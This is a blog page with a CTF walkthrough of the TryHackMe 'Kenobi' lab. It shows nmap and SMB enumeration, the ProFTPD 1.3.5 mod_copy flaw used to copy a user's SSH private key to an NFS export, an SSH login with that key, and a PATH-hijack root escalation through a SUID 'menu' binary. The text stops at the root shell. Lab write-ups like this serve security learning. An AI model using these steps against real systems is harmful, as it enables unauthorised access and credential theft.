<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Kenobi on Tryhackme" /><meta name="author" content="Zebra" /><meta property="og:locale" content="en_US" /><meta name="description" content="Walkthrough of Kenobi on TryHackme" /><meta property="og:description" content="Walkthrough of Kenobi on TryHackme" /><link rel="canonical" href="http://localhost:4000/categories/tryhackme/kenobi" /><meta property="og:url" content="http://localhost:4000/categories/tryhackme/kenobi" /><meta property="og:site_name" content="Zebra Blog" /><meta property="og:image" content="http://localhost:4000/assets/img/thm-images/kenobi.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-29T20:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/thm-images/kenobi.png" /><meta property="twitter:title" content="Kenobi on Tryhackme" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Zebra" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Walkthrough of Kenobi on TryHackme","@type":"BlogPosting","headline":"Kenobi on Tryhackme","dateModified":"2020-10-29T20:00:00+01:00","datePublished":"2020-10-29T20:00:00+01:00","image":"http://localhost:4000/assets/img/thm-images/kenobi.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/categories/tryhackme/kenobi"},"url":"http://localhost:4000/categories/tryhackme/kenobi","author":{"@type":"Person","name":"Zebra"},"@context":"https://schema.org"}</script><title>Kenobi on Tryhackme | Zebra Blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/zebra.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Zebra Blog</a></div><div class="site-subtitle font-italic">CTFs, Ethical Hacking, Pen Testing and Programming.</p></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/resources/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/cheatsheet/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CHEAT SHEET</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/followingblogs/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>FOLLOWING BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <br> <script src="https://tryhackme.com/badge/191724"></script> <a href="https://github.com/zebra777" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['zebra','overflow.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kenobi on Tryhackme</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kenobi on Tryhackme</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Oct 29, 2020, 8:00 PM +0100" > Oct 29 <i class="unloaded">2020-10-29T20:00:00+01:00</i> </span> by <span class="author"> Zebra </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/thm-images/kenobi.png" class="post-preview-img"><p><strong><a href="https://tryhackme.com/room/kenobi">THM Kenobi Link</a></strong></p><h1 id="kenobi-writeup">Kenobi WriteUp</h1><h2 id="by-zebra">by Zebra</h2><div class="table-wrapper"><table><thead><tr><th>Room<th>Date<th>Difficulty<th>Type<th>Tags<th>Time<th>Own Intention<tbody><tr><td>Kenobi<td>29.10.2020<td>Easy<td>Walkthrought<td>Linux ,FTP, SMB , SUID<td>1h<td>Easy</table></div><hr /><h3 id="tasks"><ins>Tasks</ins></h3><div class="table-wrapper"><table><thead><tr><th>Task<th>Question<tbody><tr><td>Task 1.1<td>Make sure you’re connected to our network and deploy the machine<tr><td>Task 1.2<td>Scan the machine with nmap, how many ports are open?<tr><td>Task 2.1<td>Using nmap we can enumerate a machine for SMB shares.<tr><td>Task 2.2<td>Once you’re connected, list the files on the share. What is the file can you see?<tr><td>Task 2.3<td>What port is FTP running on?<tr><td>Task 2.4<td>What mount can we see?<tr><td>Task 3.1<td>ProFTP. What is the version?<tr><td>Task 3.2<td>How many exploits are there for the ProFTPd running?<tr><td>Task 3.3<td>Autocomplete<tr><td>Task 3.4<td>We know that the FTP service is running as the Kenobi user and an ssh key is generated for that user.<tr><td>Task 3.5<td>What is Kenobi’s user flag (/home/kenobi/user.txt)?<tr><td>Task 4.1<td>What file looks particularly out of the ordinary?<tr><td>Task 4.2<td>Run the binary, how many options appear?<tr><td>Task 4.3<td>Autocomplete<tr><td>Task 4.4<td>What is the root flag (/root/root.txt)?</table></div><h2 id="introduction"><ins>Introduction</ins></h2><p>Hello and welcome to the Write-Up of the Room “Kenobi” on tryhackme. <br /> First i make some directories for better structure.<br /> Then I check the Task, which I had to solve.<br /> We see, that with have a little red line to get the user and root flag,<br /> cause this Room is “guided”. That means that we get a lot of hints and commands in the tasks itself.</p><p><strong>So let’s begin:</strong></p><p><a href="https://i.imgur.com/OcA2KrK.gif" rel="follow"><left><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/thm-images/darth.gif" /></left></a></p><h2 id="preparation-steps"><ins>Preparation Steps</ins></h2><blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">mkdir </span>Kenobi <span class="c">#New Room folder</span>
<span class="nb">cd </span>Kenobi   	<span class="c">#Move into folder</span>
<span class="nb">mkdir </span>nmap  	<span class="c">#Nmap directory</span>
<span class="nb">mkdir </span>gobuster  <span class="c">#Gobuster directory</span>
</pre></table></code></div></div></blockquote><h1 id="scanning-and-enumeration"><ins>Scanning and Enumeration</ins></h1><p>Lets begin with a simple nmap only Portscan and sort with a grep command</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/thm/kenobi]-[IP:][]-[Target:][10.10.248.210]
└─<span class="nv">$ </span>nmap <span class="nt">-Pn</span> 10.10.248.210 <span class="nt">-oN</span> ./nmap/ports                  
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-30 09:10 CET
Nmap scan report <span class="k">for </span>10.10.248.210
Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.57 seconds
                                                                                                                            
<span class="nb">cat</span> ./nmap/ports|grep open | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
21,22,80,111,139,445,2049,
</pre></table></code></div></div><p>Now we can use this little Portscan to scan the Ports fully.</p><p><code class="language-plaintext highlighter-rouge">nmap -A -T4 -p 21,22,80,111,139,445,2049 10.10.248.210</code></p><p>Our output shows us the following results:</p><div class="table-wrapper"><table><thead><tr><th>Port<th>Service<th>Information’s<tbody><tr><td>21/tcp<td>ftp<td>ProFTPD 1.3.5<tr><td>22/tcp<td>ssh<td>OPEN SSH 7.2p2 Ubuntu<tr><td>80/tcp<td>webserver<td>Apache 2.4.18 Webserver Ubuntu<tr><td>111/tcp<td>rcpbind<td>rcpbind service<tr><td>139/tcp<td>samba<td>wrgr:WORKGROUP<tr><td>445/tcp<td>samba<td>4.3.11 - Ubuntu wrgr:WORKGROUP<tr><td>2049/tcp<td>nfs_acl<td>—-</table></div><p>### <strong>Task 1.1 + 1.2 solved</strong> ###</p><h2 id="samba-enumeration">Samba Enumeration</h2><blockquote><p>I cut some information’s out of the nmap output!</p></blockquote><p><ins>SMB Scanning</ins></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.248.210
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-30 09:21 CET
Nmap scan report <span class="k">for </span>10.10.248.210
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   <span class="se">\\</span>10.10.248.210<span class="se">\I</span>PC<span class="nv">$:</span> 
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   <span class="se">\\</span>10.10.248.210<span class="se">\a</span>nonymous: 
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   <span class="se">\\</span>10.10.248.210<span class="se">\p</span>rint<span class="nv">$:</span> 
|     Anonymous access: &lt;none&gt;
|_    Current user access: &lt;none&gt;

</pre></table></code></div></div><p><ins>Inspect SMB shares</ins></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smbclient //10.10.248.210/anonymous
Enter WORKGROUP<span class="se">\k</span>ali<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
</span></pre></table></code></div></div><blockquote><p>One textfile found -&gt; download this</p></blockquote><p><ins>Download the file</ins></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>smbget <span class="nt">-R</span> smb://10.10.248.210/anonymous
Password <span class="k">for</span> <span class="o">[</span>kali] connecting to //anonymous/10.10.248.210: 
Using workgroup WORKGROUP, user kali
smb://10.10.248.210/anonymous/log.txt 
Downloaded 11,95kB <span class="k">in </span>5 seconds
  
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/thm/kenobi]-[IP:][]-[Target:][10.10.248.210]
└─<span class="nv">$ </span>la
insgesamt 12K
drwxr-xr-x 1 kali kali 248 30. Okt 09:28 downloads/
drwxr-xr-x 1 kali kali   0 29. Okt 20:23 gobuster/
<span class="nt">-rwxr-xr-x</span> 1 kali kali 12K 30. Okt 09:29 log.txt<span class="k">*</span>
drwxr-xr-x 1 kali kali 264 30. Okt 09:05 nmap/
</pre></table></code></div></div><blockquote><p>In the log.txt you will get a lot of information’s about the ftp service.</p></blockquote><p>### <strong>Task 2.1 - 2.3 solved</strong> ###</p><h2 id="rcp-enumeration">RCP enumeration</h2><p>For Task 2.4 we do a little jump to the RPC.</p><blockquote><p>What means RPC:<br /> “This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.”<br /> <a href="https://linux.die.net/man/8/rpcbind">https://linux.die.net/man/8/rpcbind</a></p></blockquote><p>With nmap we can enumerate this service:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p</span> 111 <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.248.210
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-30 09:37 CET
Nmap scan report <span class="k">for </span>10.10.248.210
Host is up <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /<span class="k">***</span> <span class="k">*</span>
</pre></table></code></div></div><p>### <strong>Task 2.4 solved</strong> ###</p><h1 id="exploitation"><ins>Exploitation</ins></h1><h2 id="proftp-enumeration-and-exploitation"><ins>ProFTP enumeration and exploitation</ins></h2><blockquote><p>ProFTPd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.</p></blockquote><blockquote><blockquote><p>For the Task 1 use the nmap protocol you saved earlier.</p></blockquote></blockquote><p><ins>Find some exploits for this</ins></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>searchsploit proftp 1.3.5              
<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                  |  Path
<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Command Execution    | linux/remote/37262.rb
ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote CE            | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                       | linux/remote/36742.txt
<span class="nt">------------------------------------------------</span> <span class="nt">---------------------------------</span>
</pre></table></code></div></div><p>When you find some interesting things you can take look at the file with:</p><p><code class="language-plaintext highlighter-rouge">searchsploit -x linux/remote/36742.txt</code></p><p>Or save the files to your location with:</p><p><code class="language-plaintext highlighter-rouge">searchsploit -m linux/remote/37262.rb</code></p><blockquote><p>More infos about the exploit <a href="https://www.cvedetails.com/cve/CVE-2015-3306/">https://www.cvedetails.com/cve/CVE-2015-3306/</a></p></blockquote><p>For this task we have to use <code class="language-plaintext highlighter-rouge">SITE CPFR and SITE CPTO commands</code>. I never heard about this. so here are my steps:</p><ol><li>Use <code class="language-plaintext highlighter-rouge">nc 10.10.248.210 21</code><li>Checkout the help pate <code class="language-plaintext highlighter-rouge">site help</code><li>Get informations out of google.<a href="http://www.proftpd.org/docs/contrib/mod_copy.html#SITE_CPFR">http://www.proftpd.org/docs/contrib/mod_copy.html#SITE_CPFR</a></ol><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>nc 10.10.248.210 21
220 ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>10.10.248.210]
site <span class="nb">help
</span>214-The following SITE commands are recognized <span class="o">(</span><span class="k">*</span> <span class="o">=&gt;</span><span class="s1">'s unimplemented)
 CPFR &lt;sp&gt; pathname
 CPTO &lt;sp&gt; pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@kenobi
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
</span></pre></table></code></div></div><p><ins>Lets mount the nfs and copy the id_rsa</ins></p><blockquote><p>Why and what could we mount? We find out in the step before that on port 111/tcp nfs is running and scan this with nmap-scrips. That shows us the mountable drives.</p></blockquote><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> /mnt/kenobiNFS

mount 10.10.248.210:/var /mnt/kenobiNFS
mount.nfs: failed to apply fstab options

<span class="nt">-----</span><span class="o">&gt;</span> Not reachable cause to has to use <span class="s2">"sudo"</span>

<span class="nb">sudo </span>mount 10.10.248.210:/var /mnt/kenobiNFS
                                                                                
la /mnt/kenobiNFS 
insgesamt 48K
drwxr-xr-x  2 root root    4,0K  4. Sep 2019  backups/
drwxr-xr-x  9 root root    4,0K  4. Sep 2019  cache/
drwxrwxrwt  2 root root    4,0K  4. Sep 2019  crash/
drwxr-xr-x 40 root root    4,0K  4. Sep 2019  lib/
drwxrwsr-x  2 root staff   4,0K 12. Apr 2016  <span class="nb">local</span>/
lrwxrwxrwx  1 root root       9  4. Sep 2019  lock -&gt; /run/lock/
drwxrwxr-x 10 root crontab 4,0K  4. Sep 2019  log/
drwxrwsr-x  2 root mail    4,0K 27. Feb 2019  mail/
drwxr-xr-x  2 root root    4,0K 27. Feb 2019  opt/
lrwxrwxrwx  1 root root       4  4. Sep 2019  run -&gt; /run/
drwxr-xr-x  2 root root    4,0K 30. Jan 2019  snap/
drwxr-xr-x  5 root root    4,0K  4. Sep 2019  spool/
drwxrwxrwt  6 root root    4,0K 30. Okt 10:00 tmp/
drwxr-xr-x  3 root root    4,0K  4. Sep 2019  www/
</pre></table></code></div></div><p><ins>SSH connection with the priv_key</ins></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nb">cp</span> /mnt/kenobiNFS/tmp/id_rsa <span class="nb">.</span>           

la               
insgesamt 16K
drwxr-xr-x 1 kali kali  248 30. Okt 09:28 downloads/
drwxr-xr-x 1 kali kali    0 29. Okt 20:23 gobuster/
<span class="nt">-rw-r--r--</span> 1 kali kali 1,7K 30. Okt 10:10 id_rsa
<span class="nt">-rwxr-xr-x</span> 1 kali kali  12K 30. Okt 09:29 log.txt<span class="k">*</span>
drwxr-xr-x 1 kali kali  264 30. Okt 09:05 nmap/

<span class="nb">sudo chmod </span>600 id_rsa                       

ssh <span class="nt">-i</span> id_rsa kenobi@10.10.248.210
load pubkey <span class="s2">"id_rsa"</span>: invalid format
The authenticity of host <span class="s1">'10.10.248.210 (10.10.248.210)'</span>


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.

kenobi@kenobi:~<span class="nv">$ </span><span class="nb">cat</span> /home/kenobi/user.txt

</pre></table></code></div></div><p>### <strong>Task 3.1 - 3.5 solved</strong> ###</p><h1 id="privilege-escalation"><ins>Privilege escalation</ins></h1><h2 id="suid-escalation"><ins>SUID Escalation</ins></h2><blockquote><p>The Task 4 give us a hint we had to look for SUIDs.</p></blockquote><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>kenobi@kenobi:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~<span class="nv">$ </span>

</pre></table></code></div></div><p>One of this listed ones is interesting and not normal one.</p><p><ins>Exploitations and path change</ins></p><p>check out the /usr/bin/menu</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>strings /usr/bin/menu

<span class="k">***************************************</span>
1. status check
2. kernel version
3. ifconfig
<span class="k">**</span> Enter your choice :
curl <span class="nt">-I</span> localhost
<span class="nb">uname</span> <span class="nt">-r</span>
ifconfig

</pre></table></code></div></div><blockquote><p>With that information we know the commands, which get used by this binary</p></blockquote><p><ins>Thing to do:</ins></p><ol><li>Manipulate the “curl” command with something useful, that runs by root<li>change $PATH<li>excecute /usr/bin/menu with option “1”</ol><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>kenobi@kenobi:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/
kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">echo</span> /bin/sh <span class="o">&gt;</span> curl
kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 curl 
kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
kenobi@kenobi:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp<span class="nv">$ </span>/usr/bin/menu

<span class="k">***************************************</span>
1. status check
2. kernel version
3. ifconfig
<span class="k">**</span> Enter your choice :1
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kenobi<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kenobi<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,114<span class="o">(</span>sambashare<span class="o">)</span>
<span class="c"># bash -i</span>
To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.

